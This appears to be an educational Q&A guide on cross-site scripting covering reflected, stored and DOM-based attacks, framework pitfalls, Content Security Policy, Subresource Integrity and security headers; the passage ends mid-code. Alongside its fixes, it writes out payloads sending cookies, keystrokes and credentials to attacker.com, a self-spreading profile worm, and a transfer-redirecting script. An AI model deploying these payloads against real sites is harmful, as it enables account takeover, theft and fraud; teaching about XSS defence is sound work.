## Section 1: Fundamentals and Attack Mechanics

**Q1. What is Cross-Site Scripting, why does it exist, and what makes it dangerous despite being "just JavaScript"?**
A: Cross-Site Scripting (XSS) is a code injection attack where an attacker causes a victim's browser to execute attacker-controlled JavaScript in the context of a trusted origin. The browser's same-origin policy (SOP) is the web's primary security boundary — it prevents `evil.com` from reading data from `bank.com`. XSS collapses this boundary: the attacker's script runs *inside* `bank.com`'s origin, so the browser grants it every privilege the legitimate page has.

The vulnerability exists because HTML is a mixed-content format: it interleaves markup, script, and data in a single document. When user-supplied data is embedded into that document without being properly encoded for its context, the browser's HTML parser may interpret it as markup or script rather than inert text.

What an attacker can do once they have arbitrary script execution inside the victim's origin:

```javascript
// 1. Session hijacking — steal cookies not protected by HttpOnly
document.location = "https://attacker.com/steal?c=" + document.cookie;

// 2. Credential harvesting — inject a fake login form over the real page
document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999">
        <form action="https://attacker.com/harvest" method="POST">
            Your session expired. Please log in again.<br>
            <input name="username" placeholder="Email"><br>
            <input name="password" type="password" placeholder="Password"><br>
            <button type="submit">Log in</button>
        </form>
    </div>`;

// 3. Keylogging — capture everything typed on the page
document.addEventListener("keypress", e => {
    fetch("https://attacker.com/keys?k=" + encodeURIComponent(e.key));
});

// 4. CSRF token exfiltration — bypass CSRF protection
const token = document.querySelector('meta[name="csrf-token"]').content;
fetch("https://bank.com/api/transfer", {
    method: "POST",
    headers: { "X-CSRF-Token": token, "Content-Type": "application/json" },
    body: JSON.stringify({ to: "attacker_account", amount: 50000 }),
    credentials: "include",
});

// 5. Crypto mining / botnet — use victim's browser as a compute node
// 6. Browser exploitation — pivot to CVE-based browser exploits
// 7. Internal network scanning — browser as a proxy to internal services
```

The "it's just JavaScript" dismissal is wrong precisely because JavaScript inside your origin has unrestricted access to every DOM element, every cookie, every stored credential, and the ability to make credentialed API calls on behalf of the user. In a fintech application, a single XSS vulnerability can chain to wire transfers, account takeover, and exfiltration of financial data.

**Q2. What are the three types of XSS, and what distinguishes them architecturally?**
A: The three types differ in where the payload is stored, how it is delivered to the victim, and what server-side behavior is required.

**Reflected XSS — payload in the request, reflected in the response:**
The injected script is embedded in the HTTP request (URL parameter, form field, header) and reflected back in the HTTP response without being stored. The victim must click a crafted link for the attack to execute.

```
Attack flow:
1. Attacker crafts URL: https://bank.com/search?q=<script>steal()</script>
2. Attacker sends link to victim (phishing email, chat message)
3. Victim clicks → browser sends GET /search?q=<script>steal()</script>
4. Server reflects the q parameter into the HTML response:
   <h2>Search results for: <script>steal()</script></h2>
5. Browser parses the response, executes steal() in bank.com's origin
6. Attack completes — no trace in the database
```

Characteristics: no persistence, requires social engineering to deliver the link, attack evidence only in server access logs, impact is per-click.

**Stored (Persistent) XSS — payload in the database, executed for every viewer:**
The injected script is stored server-side (in a database, file, or cache) and served to every user who views the infected content. No crafted link needed — the payload executes for any user who loads the page.

```
Attack flow:
1. Attacker submits a comment/profile/message containing:
   <script>steal(document.cookie)</script>
2. Server stores the payload in the database without sanitization
3. Any user who views the page containing that comment receives:
   <div class="comment"><script>steal(document.cookie)</script></div>
4. Every viewer's browser executes steal() in the site's origin
5. Attack is persistent — runs until the payload is removed from the DB
```

Characteristics: persistent, no per-victim social engineering after initial injection, impact multiplies with page traffic, can target admin users (if the payload is in admin-visible content, it executes in the admin's session).

**DOM-Based XSS — payload processed entirely in the browser, server never sees it:**
The vulnerability is in client-side JavaScript code that reads from an attacker-controlled source (URL fragment, `document.referrer`, `window.name`, `localStorage`) and writes to a dangerous sink without sanitization. The server may serve a perfectly safe response — the vulnerability exists only in the client-side code.

```
Attack flow:
1. Attacker crafts URL: https://bank.com/dashboard#<img src=x onerror=steal()>
   The # fragment is never sent to the server — server sees only GET /dashboard
2. Server returns a legitimate, unmodified response
3. Client-side JavaScript reads the fragment:
   document.getElementById("welcome").innerHTML = location.hash.substring(1);
4. Browser parses the innerHTML assignment, executes onerror handler
5. Server logs show only a normal GET /dashboard request — no evidence of attack
```

Characteristics: server-side defenses (output encoding in templates, WAFs) are blind to it — the payload never passes through the server. Requires finding a JavaScript source-to-sink chain in client-side code.

## Section 2: Reflected XSS

**Q3. Walk through a reflected XSS attack in detail, including how to construct and deliver the payload.**
A:

```python
# Vulnerable Flask endpoint — reflects the 'q' parameter into the response
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # VULNERABLE: f-string interpolation into HTML — query is not encoded
    return f"""
    <html><body>
        <h2>Search results for: {query}</h2>
        <div id="results">...</div>
    </body></html>
    """
```

Payload construction — the attacker must break out of whatever HTML context the reflection lands in:

```
Context 1: Reflected between tags (simplest):
  <h2>Search results for: {query}</h2>
  Payload: <script>alert(1)</script>
  Result:  <h2>Search results for: <script>alert(1)</script></h2>
  ✓ script tag executed directly

Context 2: Reflected inside an attribute:
  <input type="text" value="{query}">
  Payload: " onmouseover="alert(1)
  Result:  <input type="text" value="" onmouseover="alert(1)">
  ✓ injects an event handler by closing the value attribute

Context 3: Reflected inside a JavaScript string:
  <script>var search = "{query}";</script>
  Payload: "; alert(1); var x = "
  Result:  <script>var search = ""; alert(1); var x = "";</script>
  ✓ breaks out of the string literal, injects alert()

Context 4: Reflected in a URL attribute:
  <a href="/redirect?to={query}">Click here</a>
  Payload: javascript:alert(1)
  Result:  <a href="/redirect?to=javascript:alert(1)">Click here</a>
  ✓ javascript: pseudo-protocol executes when the link is clicked
```

Delivery — URL encoding for evasion:

```
Raw payload: <script>document.location='https://attacker.com?c='+document.cookie</script>
URL encoded: %3Cscript%3Edocument.location%3D%27https%3A%2F%2Fattacker.com%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E

Full attack URL:
https://bank.com/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fattacker.com%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E

Shortened and embedded in a phishing email:
"Your account requires verification. Click here to confirm: https://bit.ly/3xK9mP"
```

**Q4. What server-side defenses specifically prevent reflected XSS?**
A: Reflected XSS prevention is output encoding — transforming characters that have special meaning in HTML into their entity equivalents before embedding user input into an HTML response. The encoding must be context-aware: the correct encoding for a value between HTML tags differs from inside an attribute, inside a JavaScript string, or inside a CSS block.

```python
# Context 1: HTML entity encoding — between tags
from markupsafe import escape   # Flask/Jinja2's safe escaping library

# VULNERABLE:
return f"<h2>Results for: {query}</h2>"

# CORRECT — HTML entity encoding:
# < → &lt;   > → &gt;   & → &amp;   " → &quot;   ' → &#x27;
return f"<h2>Results for: {escape(query)}</h2>"
# Input: <script>alert(1)</script>
# Output: &lt;script&gt;alert(1)&lt;/script&gt;
# Browser renders: <script>alert(1)</script> as visible text, not executable script

# Context 2: HTML attribute encoding — inside attribute values
# VULNERABLE:
return f'<input value="{query}">'
# CORRECT — always quote attributes AND encode the value:
return f'<input value="{escape(query)}">'
# Input: " onmouseover="alert(1)
# Output: <input value="&quot; onmouseover=&quot;alert(1)">  ← attack neutralized

# Context 3: JavaScript context — inside a <script> block
import json
# VULNERABLE:
return f"<script>var q = '{query}';</script>"
# CORRECT — JSON-encode the value; never use escape() for JS context
safe_query = json.dumps(query)  # wraps in quotes, escapes all JS-special chars
return f"<script>var q = {safe_query};</script>"
# Input: '; alert(1); var x = '
# Output: <script>var q = "'; alert(1); var x = '";</script>
# The single quotes are JSON-escaped → cannot break out of the string

# Context 4: URL context — inside href/src attributes
from urllib.parse import quote
# CORRECT — URL-encode the value, then HTML-encode the attribute
url_safe = quote(query, safe="")
return f'<a href="/search?q={escape(url_safe)}">Search</a>'
```

The best server-side defense is a template engine with auto-escaping enabled — context-aware escaping applied by default to every template expression, requiring explicit opt-out for trusted content:

```python
# Jinja2 with autoescape — the gold standard for Python web apps
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(["html", "xml"]))
# Every {{ variable }} is HTML-entity-encoded automatically
# To output trusted HTML: {{ trusted_html | safe }}  ← explicit opt-in, auditable

# Django templates — autoescape is ON by default
# {{ query }} → HTML-encoded in template output
# {{ query | safe }} → explicitly mark as safe (should be rare and reviewed)

# Never disable autoescape globally — disable it only for specific, trusted variables
```

## Section 3: Stored XSS

**Q5. What makes stored XSS more severe than reflected, and what attack scenarios does it enable that reflected cannot?**
A: The severity difference is reach and persistence. Reflected XSS requires the attacker to trick each victim individually into clicking a crafted link — the blast radius is bounded by the attacker's ability to distribute the link. Stored XSS infects a shared data store and executes for every user who loads the infected page — the attacker injects once and the payload reaches all viewers automatically.

Scenarios exclusively or practically enabled by stored XSS:

**Admin account takeover via self-executing payload:**
```
Attacker submits a support ticket with subject:
<img src=x onerror="fetch('https://attacker.com/steal?t='+document.cookie)">

When the support admin loads the ticket queue, the payload fires in the admin's session.
The attacker receives the admin's session cookie.
Admin accounts often have access to user data export, account management,
and configuration panels — the stolen admin session enables full platform compromise.
This attack is invisible to the victim: it fires on page load with no user action.
```

**Worm propagation — self-replicating stored XSS:**
```javascript
// Payload injected into a social network profile:
// When any user views this profile, the worm:
// 1. Reads the victim's auth token from the page
// 2. Updates the victim's own profile to contain the same worm payload
// 3. The worm spreads to every visitor of every infected profile

fetch("/api/profile/update", {
    method: "PUT",
    headers: {
        "Content-Type": "application/json",
        "X-CSRF-Token": document.querySelector('[name=csrf_token]').value
    },
    body: JSON.stringify({
        bio: '<img src=x onerror="' + encodeURIComponent(worm_payload) + '">'
    }),
    credentials: "include"
}).then(() => {
    // Also exfiltrate victim's data to attacker's server
    fetch("https://attacker.com/data?" + new URLSearchParams({
        cookies: document.cookie,
        user: JSON.stringify(window.__INITIAL_STATE__.user)
    }));
});
// The Samy worm (MySpace, 2005) used this pattern — infected 1 million profiles in 20 hours
```

**Persistent cryptocurrency theft:**
```javascript
// Injected into a fintech app's transaction notes field
// Fires every time the victim views their transaction history

// Replace the destination account number on the transfer form
document.addEventListener("DOMContentLoaded", () => {
    const accountField = document.getElementById("destination_account");
    if (accountField) {
        accountField.value = "ATTACKER_ACCOUNT";
        // Override dispatchEvent to prevent the real value from being set
        Object.defineProperty(accountField, "value", {
            set: (v) => { /* silently discard */ },
            get: () => "ATTACKER_ACCOUNT"
        });
    }
});
```

**Q6. Walk through how stored XSS is introduced in a Node.js/React application.**
A:

```javascript
// --- SERVER SIDE (Node.js/Express) ---

// Vulnerable endpoint: stores user-submitted comment without sanitization
app.post("/api/comments", authenticate, async (req, res) => {
    const { content, articleId } = req.body;

    // VULNERABLE: content stored raw — no sanitization before DB insert
    // Parameterized query prevents SQL injection, but the content value itself is unsafe
    await db.query(
        "INSERT INTO comments (user_id, article_id, content) VALUES ($1, $2, $3)",
        [req.user.id, articleId, content]
    );
    res.json({ success: true });
});

// Retrieval endpoint — returns the raw stored content
app.get("/api/comments/:articleId", async (req, res) => {
    const { rows } = await db.query(
        "SELECT id, user_id, content, created_at FROM comments WHERE article_id = $1",
        [req.params.articleId]
    );
    res.json(rows);   // raw content sent to client
});
```

```jsx
// --- CLIENT SIDE (React) ---

// The critical distinction: dangerouslySetInnerHTML vs. JSX expressions
function CommentList({ comments }) {
    return (
        <div className="comments">
            {comments.map(comment => (
                <div key={comment.id} className="comment">

                    {/* SAFE — React escapes this automatically */}
                    <p>{comment.content}</p>

                    {/* VULNERABLE — dangerouslySetInnerHTML bypasses React's escaping */}
                    <p dangerouslySetInnerHTML={{ __html: comment.content }} />
                    {/* If comment.content = '<script>steal()</script>',
                        React injects it raw into the DOM — script executes */}

                    {/* ALSO VULNERABLE — direct DOM manipulation */}
                    {/* (in a useEffect or event handler): */}
                    {/* document.getElementById(`c-${comment.id}`).innerHTML = comment.content; */}
                </div>
            ))}
        </div>
    );
}
```

React's JSX expressions (`{variable}`) are safe by default — React calls `textContent` (not `innerHTML`) for string values and escapes HTML entities for everything rendered via JSX. The vulnerability in React applications is almost always either:
1. `dangerouslySetInnerHTML` used with untrusted content.
2. Direct DOM manipulation via `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`.
3. Third-party libraries that accept HTML strings and render them unsafely.

Fix:

```javascript
// Server-side: sanitize on write (when content is stored)
import DOMPurify from "isomorphic-dompurify";  // server-safe DOMPurify

app.post("/api/comments", authenticate, async (req, res) => {
    const { content, articleId } = req.body;

    // Sanitize before storage: strip all dangerous HTML, keep safe formatting
    const sanitized = DOMPurify.sanitize(content, {
        ALLOWED_TAGS:  ["b", "i", "em", "strong", "p", "br", "a"],
        ALLOWED_ATTR:  ["href"],       // only href on <a>
        ALLOWED_PROTOCOLS: ["https"],  // no javascript: or data: hrefs
        FORCE_BODY:    true,
    });

    await db.query(
        "INSERT INTO comments (user_id, article_id, content) VALUES ($1, $2, $3)",
        [req.user.id, articleId, sanitized]  // store sanitized content
    );
    res.json({ success: true });
});

// Client-side: use textContent for plain text, DOMPurify for rich text
function CommentList({ comments }) {
    return (
        <div>
            {comments.map(comment => (
                <div key={comment.id}>
                    {/* If plain text is sufficient: */}
                    <p>{comment.content}</p>  {/* React escapes — always safe */}

                    {/* If rich HTML is needed (sanitized server-side + client-side defense-in-depth): */}
                    <div dangerouslySetInnerHTML={{
                        __html: DOMPurify.sanitize(comment.content)  // double-sanitize
                    }} />
                </div>
            ))}
        </div>
    );
}
```

## Section 4: DOM-Based XSS

**Q7. What makes DOM-based XSS fundamentally different from reflected and stored, and why are traditional server-side defenses blind to it?**
A: DOM-based XSS is a client-side vulnerability. The server plays no role in the attack path — it serves a legitimate, correctly encoded response. The vulnerability exists entirely in JavaScript code that reads from an attacker-influenced source and writes to a dangerous sink without sanitization.

Sources — places in the browser where attacker-controlled data can originate:

```javascript
// High-risk sources: data the attacker can control without server interaction
location.href          // full URL including hash
location.hash          // fragment — never sent to server
location.search        // query string
location.pathname      // URL path
document.referrer      // referring page URL — attacker controls the page that links here
window.name            // persists across navigations — attacker can set it on a page they control
document.cookie        // if attacker has cookie-injection capability
localStorage           // if attacker can write to localStorage via another vulnerability
postMessage events     // if the message origin is not validated
```

Sinks — DOM APIs that interpret strings as HTML or executable code:

```javascript
// Dangerous sinks — never pass user-controlled data to these without sanitization
element.innerHTML       = userInput;   // parses as HTML — executes script
element.outerHTML       = userInput;
element.insertAdjacentHTML("beforeend", userInput);
document.write(userInput);
document.writeln(userInput);
eval(userInput);                       // executes as JavaScript directly
setTimeout(userInput, 0);             // string arg executes as JS
setInterval(userInput, 1000);
new Function(userInput)();
element.src             = userInput;   // if javascript: URI
element.href            = userInput;
location.href           = userInput;   // can be javascript: URI
location                = userInput;

// Surprisingly dangerous:
jQuery(userInput);                     // jQuery selector parsing can execute scripts
$(userInput);                          // same — older jQuery versions are particularly bad
element.setAttribute("onclick", userInput);  // event handler attributes
```

Why server-side defenses are blind:

```
Traditional server flow:
  Browser → HTTP request → Server → Template engine (output-encodes) → HTTP response → Browser

DOM XSS flow:
  https://bank.com/app#<img src=x onerror=steal()>
  Browser → HTTP request (GET /app, fragment not sent) → Server → Legitimate response → Browser
                                                                                          ↓
                                                                           Client JS reads location.hash
                                                                           Writes to innerHTML ← vulnerability here
  The server sees only "GET /app" — the payload travels in the fragment, never reaches the server.
  WAF, output encoding in templates, server-side sanitization — none of these see the payload.
```

**Q8. Walk through identifying and exploiting a DOM-based XSS vulnerability, then show the fix.**
A:

```javascript
// Vulnerable SPA routing code — reads the URL hash to render a "page"
// Found in: assets/js/router.js

function renderPage() {
    // SOURCE: location.hash — fully attacker-controlled
    const page = location.hash.substring(1);  // strip the leading #

    // ... various page components ...

    // SINK: innerHTML — interprets the string as HTML
    document.getElementById("main-content").innerHTML =
        `<div class="page">${page}</div>`;
    //  ↑ if page = '<img src=x onerror=steal()>', the onerror fires
}

window.addEventListener("hashchange", renderPage);
window.addEventListener("load", renderPage);
```

Exploitation — attacker sends victim:
```
https://bank.com/app#<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

The `#` fragment is never sent to the server. The server returns the normal `/app` response. `renderPage()` runs, reads the hash, injects it via `innerHTML` — `onerror` fires and exfiltrates cookies.

Identifying DOM XSS — the source-to-sink analysis:

```javascript
// Step 1: Find all reads from attacker-controlled sources
// Grep for sources in the codebase:
// grep -rn "location.hash\|location.search\|document.referrer\|window.name" --include="*.js"

// Step 2: Trace the data flow from each source
// Step 3: Check if data reaches a dangerous sink before sanitization

// Common sink patterns to grep for:
// grep -rn "innerHTML\|outerHTML\|insertAdjacentHTML\|document.write\|eval(" --include="*.js" --include="*.ts"
// grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx"
// grep -rn "\$(" --include="*.js"  # jQuery — check if selector comes from user input
```

Fix — sanitize before writing to dangerous sinks, or use safe DOM APIs:

```javascript
// FIX 1: Avoid innerHTML — use textContent for plain text (does not parse HTML)
function renderPage() {
    const page = location.hash.substring(1);
    const container = document.getElementById("main-content");
    const wrapper = document.createElement("div");
    wrapper.className = "page";
    wrapper.textContent = page;   // textContent sets text only — never parses as HTML
    container.replaceChildren(wrapper);
    // Input: <img src=x onerror=steal()>
    // Output: literal text "<img src=x onerror=steal()>" displayed on screen — not executed
}

// FIX 2: If HTML rendering is required — sanitize with DOMPurify before innerHTML
import DOMPurify from "dompurify";

function renderPage() {
    const page = location.hash.substring(1);
    const clean = DOMPurify.sanitize(page, {
        ALLOWED_TAGS:  ["b", "i", "em", "strong", "p", "br"],
        ALLOWED_ATTR:  [],  // no attributes — eliminates event handlers
    });
    document.getElementById("main-content").innerHTML =
        `<div class="page">${clean}</div>`;
}

// FIX 3: Validate hash against an allowlist of known page names
const VALID_PAGES = new Set(["home", "dashboard", "profile", "settings"]);

function renderPage() {
    const page = location.hash.substring(1);
    if (!VALID_PAGES.has(page)) {
        renderPageNotFound();
        return;
    }
    // page is now a known-safe string from our own set
    loadPageComponent(page);  // renders via a component registry, not innerHTML
}

// FIX 4: Safe DOM API pattern — build elements programmatically
function renderWelcome(username) {
    // VULNERABLE:
    document.getElementById("welcome").innerHTML = `<b>Hello, ${username}!</b>`;

    // CORRECT:
    const el = document.getElementById("welcome");
    el.textContent = "";             // clear existing content
    const b = document.createElement("b");
    b.textContent = `Hello, ${username}!`;  // textContent is always safe
    el.appendChild(b);
}
```

**Q9. What are the dangerous patterns in popular frameworks that introduce DOM XSS?**
A: Every major framework has escape hatches that, when used with user-controlled data, reintroduce DOM XSS:

```jsx
// React
// SAFE — JSX expressions use textContent internally
<div>{userInput}</div>

// VULNERABLE — explicit opt-out of React's escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// VULNERABLE — href with javascript: URI (React does not block javascript: in href)
<a href={userInput}>Click</a>
// Input: javascript:steal()  → executes on click
// FIX: validate href starts with https:// before using
const safeHref = userInput.startsWith("https://") ? userInput : "#";
<a href={safeHref}>Click</a>

// VULNERABLE — direct DOM mutation in useEffect
useEffect(() => {
    document.getElementById("content").innerHTML = userInput;  // bypasses React entirely
}, [userInput]);
```

```typescript
// Angular
// SAFE — Angular's template binding {{ }} HTML-encodes automatically
<p>{{ userInput }}</p>

// VULNERABLE — bypassing Angular's DomSanitizer
import { DomSanitizer } from "@angular/platform-browser";

constructor(private sanitizer: DomSanitizer) {}

// WRONG: bypassSecurityTrustHtml marks content as trusted without sanitizing
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
// In template: <div [innerHTML]="trustedHtml"></div>  ← executes scripts

// CORRECT: sanitize before trusting
this.safeHtml = this.sanitizer.sanitize(SecurityContext.HTML, userInput);
// Angular's sanitize() strips dangerous elements and attributes

// VULNERABLE — [innerHTML] binding with unsanitized string
<div [innerHTML]="userInput"></div>
// Angular sanitizes [innerHTML] bindings by default, BUT:
// bypassSecurityTrustHtml() used anywhere in the chain defeats this
```

```javascript
// Vue.js
// SAFE — {{ }} text interpolation encodes HTML entities
<p>{{ userInput }}</p>

// VULNERABLE — v-html directive renders raw HTML
<div v-html="userInput"></div>
// Input: <img src=x onerror=steal()> → executes

// FIX: use DOMPurify before v-html
import DOMPurify from "dompurify";
computed: {
    sanitizedContent() {
        return DOMPurify.sanitize(this.userInput);
    }
}
<div v-html="sanitizedContent"></div>
```

```javascript
// jQuery — historically a major DOM XSS source
// VULNERABLE — $ selector with user input (jQuery 1.x and early 2.x)
$(location.hash);  // if hash = '<img src=x onerror=steal()>', jQuery creates and appends it
$(userInput).appendTo("body");

// VULNERABLE — .html() with user input
$("#container").html(userInput);  // equivalent to innerHTML

// VULNERABLE — .append() with HTML string
$("#list").append("<li>" + userInput + "</li>");

// SAFE — .text() sets textContent, never parses HTML
$("#container").text(userInput);

// SAFE — create elements programmatically
const li = $("<li>").text(userInput);
$("#list").append(li);
```

## Section 5: Content Security Policy

**Q10. What is Content Security Policy, and how does it mitigate XSS as a defense-in-depth control?**
A: Content Security Policy (CSP) is an HTTP response header (or `<meta>` tag) that instructs the browser which sources of content are legitimate for a given page. It is a browser-enforced allowlist: scripts, styles, images, fonts, and other resources may only load from explicitly approved origins. If XSS injects a `<script>` tag pointing to an attacker's server, CSP causes the browser to block the load — the injected script never executes.

CSP is defense-in-depth, not a primary defense. Output encoding prevents XSS; CSP reduces the impact of XSS that escapes the primary defenses. The distinction matters because CSP can be difficult to configure restrictively for complex applications, and a permissive CSP provides limited protection.

The header:

```
Content-Security-Policy: directive1 value1 value2; directive2 value3; ...
```

Directives control different resource types:

```
script-src    — controls JavaScript execution
style-src     — controls CSS loading
img-src       — controls image loading
font-src      — controls font loading
connect-src   — controls fetch/XHR/WebSocket destinations
frame-src     — controls iframe sources
object-src    — controls <object>, <embed>, <applet>
base-uri      — controls <base href> (prevents base tag injection)
form-action   — controls where forms can submit
frame-ancestors — controls who can embed this page in an iframe (replaces X-Frame-Options)
default-src   — fallback for any directive not explicitly specified
upgrade-insecure-requests — upgrades HTTP sub-resources to HTTPS automatically
```

How CSP blocks XSS payloads:

```
Attack 1: Injected <script> from external origin
  Payload: <script src="https://attacker.com/xss.js"></script>
  CSP:     script-src 'self'
  Result:  Browser checks src against script-src — attacker.com not in allowlist → BLOCKED

Attack 2: Injected inline <script>
  Payload: <script>steal(document.cookie)</script>
  CSP:     script-src 'self'  (no 'unsafe-inline')
  Result:  Browser blocks all inline scripts by default → BLOCKED

Attack 3: Event handler attribute injection
  Payload: <img src=x onerror="steal()">
  CSP:     script-src 'self'  (no 'unsafe-inline')
  Result:  Inline event handlers are blocked by the same rule as inline scripts → BLOCKED

Attack 4: javascript: URI
  Payload: <a href="javascript:steal()">Click</a>
  CSP:     script-src 'self'  (no 'unsafe-inline')
  Result:  javascript: URIs treated as inline scripts → BLOCKED
```

**Q11. What does a production-grade CSP look like, and how do you build one for a complex SPA?**

**Production CSP for a React SPA with nonces (strict, no 'unsafe-inline'):**

```python
import secrets

@app.after_request
def add_csp(response):
    # Generate a unique nonce per request — 128 bits of randomness
    nonce = secrets.token_urlsafe(16)
    # Store nonce in g so the template can access it
    g.csp_nonce = nonce

    csp = "; ".join([
        "default-src 'none'",

        # Scripts: only from self and inline scripts with the correct nonce
        # 'strict-dynamic' allows scripts loaded by trusted scripts to run
        # without being in the allowlist — essential for modern bundled apps
        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'",

        # Styles: self + inline styles with nonce (for CSS-in-JS)
        f"style-src 'self' 'nonce-{nonce}'",

        # Images: self + data URIs (for base64-encoded images)
        "img-src 'self' data: blob:",

        # Fonts: self + Google Fonts (if used)
        "font-src 'self' https://fonts.gstatic.com",

        # API calls: only to own backend + specific third-party APIs
        "connect-src 'self' https://api.stripe.com wss://realtime.myorg.com",

        # No frames allowed — prevents clickjacking
        "frame-ancestors 'none'",

        # No <object>, <embed> — common plugin-based XSS vectors
        "object-src 'none'",

        # <base> tag restricted — prevents base tag injection attacks
        "base-uri 'self'",

        # Forms can only submit to own origin
        "form-action 'self'",

        # Report violations to endpoint for monitoring
        "report-uri /csp-violation-report",
    ])

    response.headers["Content-Security-Policy"] = csp
    return response
```

```html
<!-- HTML template — inline scripts use the nonce -->
<html>
<head>
    <!-- Inline style with nonce -->
    <style nonce="{{ g.csp_nonce }}">
        body { margin: 0; }
    </style>
</head>
<body>
    <!-- React app bundle loaded from self -->
    <script nonce="{{ g.csp_nonce }}" src="/static/app.bundle.js"></script>

    <!-- Inline bootstrap script with nonce -->
    <script nonce="{{ g.csp_nonce }}">
        window.__INITIAL_STATE__ = {{ initial_state | tojson }};
    </script>

    <!-- NO nonce = blocked by CSP, even if injected by XSS -->
    <!-- Attacker's injected: <script>steal()</script>  → BLOCKED (no nonce) -->
    <!-- Attacker's injected: <script nonce="wrong">...</script> → BLOCKED (nonce mismatch) -->
</body>
</html>
```

The nonce mechanism: each page load generates a fresh random value. Legitimate scripts include this nonce as an attribute; the browser only executes scripts with a matching nonce. An XSS payload cannot know the nonce (it was generated server-side and is different every request) — injected scripts without the nonce are blocked.

**Q12. What are the dangerous CSP keywords that weaken the policy, and when is each a necessary trade-off?**
A:

**`'unsafe-inline'` — allows all inline scripts and event handlers:**
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'

Impact: defeats CSP's protection against injected inline scripts entirely.
  <script>steal()</script>        → ALLOWED
  <img onerror="steal()">        → ALLOWED
  <a href="javascript:steal()">  → ALLOWED

When unavoidable: legacy applications with thousands of inline scripts that
cannot be refactored immediately. Use 'unsafe-inline' only as a temporary
state while migrating to nonces or hashes. Never as a permanent policy.

Better alternative: nonces (per-request random value) or hashes
  (SHA-256 of the exact script content — only that exact script is allowed)
```

**`'unsafe-eval'` — allows eval(), setTimeout(string), new Function():**
```
Content-Security-Policy: script-src 'self' 'unsafe-eval'

Impact: allows dynamic code execution from strings — significantly increases
the risk that XSS that bypasses other controls can escalate to full execution.

When required: some older libraries (AngularJS 1.x template compilation,
some webpack configurations, certain map visualization libraries) use eval.
Modern alternatives exist for all of these cases.

Better alternative: audit and replace libraries that require 'unsafe-eval'.
Angular 2+ compiles templates at build time, eliminating the need.
```

**`'strict-dynamic'` — trusts scripts loaded by trusted scripts:**
```
Content-Security-Policy: script-src 'nonce-{value}' 'strict-dynamic'

Impact: any script loaded (via import() or document.createElement("script"))
by a nonced script is automatically trusted, even from unlisted origins.

This is appropriate and recommended for modern SPAs where the app bundle
dynamically imports chunks. Without 'strict-dynamic', every CDN or dynamic
import origin must be listed explicitly — fragile and maintenance-heavy.

Risk: if a trusted script (the app bundle) is compromised via supply chain
attack, 'strict-dynamic' allows it to load additional malicious scripts.
Mitigate with Subresource Integrity (SRI).
```

**`data:` in `script-src`:**
```
Content-Security-Policy: script-src 'self' data:

NEVER DO THIS. data: URIs in script-src allow:
  <script src="data:text/javascript,steal()"></script>
This is equivalent to 'unsafe-inline' — any injected script can be wrapped
in a data: URI and executed. Remove data: from script-src entirely.
data: is acceptable in img-src for base64-encoded images.
```

**Wildcard `*` in `script-src`:**
```
Content-Security-Policy: script-src *

NEVER DO THIS. Allows scripts from any origin. Provides zero XSS protection.
The only thing * blocks is inline scripts and eval — a weak benefit.
```

**Q13. What is Subresource Integrity, and how does it work alongside CSP?**
A: Subresource Integrity (SRI) is a browser mechanism that verifies the cryptographic hash of a fetched resource before executing it. It protects against supply chain attacks where a CDN-hosted script is compromised after your page was written — even if the script URL is the same, a modified script will have a different hash and the browser will refuse to execute it.

```html
<!-- Without SRI — if CDN is compromised, attacker can serve malicious jQuery -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>

<!-- With SRI — browser verifies hash before executing -->
<script
    src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"
    integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
    crossorigin="anonymous">
</script>

<!-- If the served file's SHA-256 doesn't match the integrity attribute:
     Browser refuses to execute the script — "Subresource Integrity check failed"
     The CDN compromise is detected and blocked -->
```

```bash
# Generate SRI hash for any file
curl -s https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js | \
    openssl dgst -sha256 -binary | \
    openssl base64 -A
# sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=

# Or use the SRI Hash Generator: https://www.srihash.org/
```

SRI + CSP interaction:

```
CSP alone (without SRI):
  script-src 'self' https://cdn.jsdelivr.net
  → allows any script from cdn.jsdelivr.net, including a compromised one

CSP + SRI:
  script-src 'self' https://cdn.jsdelivr.net
  <script src="https://cdn.jsdelivr.net/..." integrity="sha256-...">
  → CSP allows the origin; SRI verifies the content hash; both must pass

'require-sri-for script' directive (experimental):
  Content-Security-Policy: require-sri-for script
  → browser refuses to load ANY script without a valid integrity attribute
  → forces SRI adoption across the entire application
```

SRI applies only to resources loaded from cross-origin sources (`crossorigin="anonymous"` required). Self-hosted resources are protected by the same-origin policy and don't need SRI — but do need integrity checks in your build pipeline (file hashing, lock files, dependency auditing).

**Q14. What other security headers complement CSP for XSS and related attack prevention?**
A:

```python
@app.after_request
def add_security_headers(response):

    # 1. X-Content-Type-Options — prevents MIME-type sniffing
    # Without this, a browser may execute a file uploaded as 'image/png'
    # if it detects JavaScript content — "content sniffing XSS"
    response.headers["X-Content-Type-Options"] = "nosniff"

    # 2. X-Frame-Options — prevents clickjacking (legacy; prefer frame-ancestors in CSP)
    # frame-ancestors 'none' in CSP supersedes this, but include for older browsers
    response.headers["X-Frame-Options"] = "DENY"

    # 3. Referrer-Policy — controls what URL is sent in the Referer header
    # Prevents leaking sensitive URL parameters (tokens, IDs) in the Referer
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

    # 4. Permissions-Policy — restricts browser features the page can use
    # An XSS payload that can't access the camera/microphone/geolocation is less dangerous
    response.headers["Permissions-Policy"] = (
        "camera=(), microphone=(), geolocation=(), "
